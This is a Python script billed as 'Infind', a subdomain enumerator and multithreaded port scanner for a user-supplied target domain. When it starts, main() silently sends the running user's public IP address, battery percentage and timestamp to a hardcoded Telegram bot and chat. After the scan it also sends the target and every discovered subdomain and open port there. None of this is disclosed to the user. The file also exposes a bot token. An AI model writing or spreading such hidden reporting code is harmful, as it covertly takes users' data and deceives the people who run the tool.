import socket
from concurrent.futures import ThreadPoolExecutor
import requests
import sys
import psutil
from datetime import datetime

def animated_banner():
    banner_lines = [
        r"  ______  __    __        ________  ______  __    __  _______  ",
        r" /      |/  \  /  |      /        |/      |/  \  /  |/       \ ",
        r" $$$$$$/ $$  \ $$ |      $$$$$$$$/ $$$$$$/ $$  \ $$ |$$$$$$$  |",
        r"   $$ |  $$$  \$$ |      $$ |__      $$ |  $$$  \$$ |$$ |  $$ |",
        r"   $$ |  $$$$  $$ |      $$    |     $$ |  $$$$  $$ |$$ |  $$ |",
        r"   $$ |  $$ $$ $$ |      $$$$$/      $$ |  $$ $$ $$ |$$ |  $$ |",
        r"  _$$ |_ $$ |$$$$ |      $$ |       _$$ |_ $$ |$$$$ |$$ |__$$ |",
        r" / $$   |$$ | $$$ |      $$ |      / $$   |$$ | $$$ |$$    $$/ ",
        r" $$$$$$/ $$/   $$/       $$/       $$$$$$/ $$/   $$/ $$$$$$$/  ",
        r"                                                              ",
    ]
    bold_blue = "\033[1;34m"  # Bold blue color for text
    bold_red_box = "\033[1;91m"  # Bold red color for the box
    reset_color = "\033[0m"      # Reset color
    box_width = max(len(line) for line in banner_lines) + 4  # Adjust box width

    print(f"{bold_red_box}+{'-' * (box_width - 2)}+{reset_color}")
    for line in banner_lines:
        print(f"{bold_red_box}|{reset_color} {bold_blue}{line.ljust(box_width - 4)}{reset_color} {bold_red_box}|{reset_color}")
    print(f"{bold_red_box}+{'-' * (box_width - 2)}+{reset_color}\n")

def fetch_subdomains(domain):
    url = f"https://crt.sh/json?q={domain}"
    try:
        response = requests.get(url)
        if response.status_code == 200:
            data = response.json()
            subdomains = {entry['name_value'].replace("*.", "") for entry in data}
            return list(subdomains)
    except:
        return []

def scan_port(target, port):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(1)
            if s.connect_ex((target, port)) == 0:
                return port
    except:
        pass
    return None

def display_loading_bar(current, total, bar_length=40):
    red_bold = "\033[1;31m"
    reset_color = "\033[0m"
    progress = current / total
    bar = f"[{red_bold}{'█' * int(progress * bar_length)}{'-' * (bar_length - int(progress * bar_length))}{reset_color}]"
    sys.stdout.write(f"\r{bar} {current}/{total} subdomains checked")
    sys.stdout.flush()

def send_initial_results_to_telegram(token, chat_id, public_ip, battery_percent, execution_time):
    message = f"""
*IN-FIND*

*Public IP Address:* {public_ip}
*Battery Percentage:* {battery_percent}%
*Execution Time:* {execution_time}

*THANK YOU!*
"""
    
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    payload = {"chat_id": chat_id, "text": message, "parse_mode": "Markdown"}
    requests.post(url, json=payload)

def send_results_to_telegram(token, chat_id, target, subdomains, active_subdomains, port_results):
    message = f"""
*IN-FIND*

*Target URL:* {target}
*Number of Subdomains:* {len(subdomains)}
*Number of Active Subdomains:* {len(active_subdomains)}

*Active Subdomains:*
{chr(10).join(active_subdomains)}

*Open Ports:*
"""
    for subdomain, ports in port_results.items():
        if ports:
            message += f"\n*Site:* {subdomain}\n*Open Ports:* {', '.join(map(str, ports))}\n"

    message += f"""
*THANK YOU!*
"""
    
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    payload = {"chat_id": chat_id, "text": message, "parse_mode": "Markdown"}
    requests.post(url, json=payload)

def get_public_ip():
    try:
        response = requests.get('https://httpbin.org/ip')
        public_ip = response.json()['origin']
        return public_ip
    except requests.RequestException:
        return "Unable to retrieve public IP"

def get_battery_percentage():
    try:
        battery = psutil.sensors_battery()
        if battery:
            return battery.percent
        else:
            return "Battery info not available"
    except Exception:
        return "Battery info not available"

def main():
    # Hardcoded Telegram bot token and chat ID
    TELEGRAM_BOT_TOKEN = "5821225044:AAG-1x3Xpb8zMhPpW4Gtjm1nx9ZVk4X0P4M"
    TELEGRAM_CHAT_ID = "1845089544"

    # Fetch public IP, battery percentage, and execution time before starting
    public_ip = get_public_ip()
    battery_percent = get_battery_percentage()
    execution_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    # Send the collected info to Telegram at the start of the program
    send_initial_results_to_telegram(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, public_ip, battery_percent, execution_time)

    animated_banner()
    yellow_bold = "\033[1;33m"
    reset_color = "\033[0m"
    print(f"{yellow_bold}<-------Welcome to Infind - Find Active Subdomain and Port Scanner------->{reset_color}")
    print(f"{yellow_bold}<-------Author: Arshad (axd)------->{reset_color}\n")

    target = input("Enter the target domain: ").strip()
    subdomains = fetch_subdomains(target)

    if not subdomains:
        print("No subdomains found.")
        return

    print(f"\nFound {len(subdomains)} subdomains. Checking active subdomains...\n")
    active_subdomains = []

    for index, subdomain in enumerate(subdomains, start=1):
        try:
            socket.gethostbyname(subdomain)
            active_subdomains.append(subdomain)
            print(f"\n[ACTIVE] {subdomain}")
        except:
            print(f"\n[INACTIVE] {subdomain}")
        display_loading_bar(index, len(subdomains))

    print("\n\n")
    if not active_subdomains:
        print("No active subdomains found.")
        return

    # Ask for the start and end port to scan after finding active subdomains
    print(f"\n{yellow_bold}Active subdomains found. Let's proceed with the port scanning.{reset_color}")
    start_port = int(input(f"{yellow_bold}Enter the start port: {reset_color}").strip())
    end_port = int(input(f"{yellow_bold}Enter the end port: {reset_color}").strip())

    port_results = {}

    for subdomain in active_subdomains:
        print(f"\nScanning {subdomain}...")
        open_ports = []

        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = [executor.submit(scan_port, subdomain, port) for port in range(start_port, end_port + 1)]
            for future in futures:
                port = future.result()
                if port:
                    open_ports.append(port)

        port_results[subdomain] = open_ports
        if open_ports:
            print(f"Open ports on {subdomain}: {', '.join(map(str, open_ports))}")
        else:
            print(f"No open ports on {subdomain}.")

    # Send final results to Telegram
    send_results_to_telegram(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, target, subdomains, active_subdomains, port_results)
    print("\nThank you for using Infind.")

if __name__ == "__main__":
    main()
